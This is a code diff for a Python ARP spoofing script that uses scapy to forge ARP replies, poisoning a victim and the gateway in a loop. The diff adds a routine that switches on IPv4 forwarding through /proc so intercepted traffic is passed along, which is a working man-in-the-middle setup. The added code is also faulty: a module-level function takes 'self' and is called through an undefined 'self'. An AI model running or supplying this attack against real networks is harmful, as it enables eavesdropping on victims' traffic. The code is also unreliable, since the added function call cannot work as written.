@@ -20,9 +20,16 @@ def get_mac(ip): # Get victim's MAC with the answers to the ARP request
 def spoof(target_ip, spoof_ip): # Build and send packet with obtained MAC and user input as parameters 
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
     scapy.send(packet, verbose = False) 
+
+def check_ipv4_forwarding(self, config='/proc/sys/net/ipv4/ip_forward'): # Enable IPv4 forwarding to not block the target while poisoning.
+    with open(config, mode='r+', encoding='utf_8') as config_file:
+        line = next(config_file)
+        config_file.seek(0)
+        config_file.write(line.replace('0', '1'))
   
 try: # Launch ARP Spoofing until keyboard interrupt 
     packets_count = 0
+    self.check_ipv4_forwarding()
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
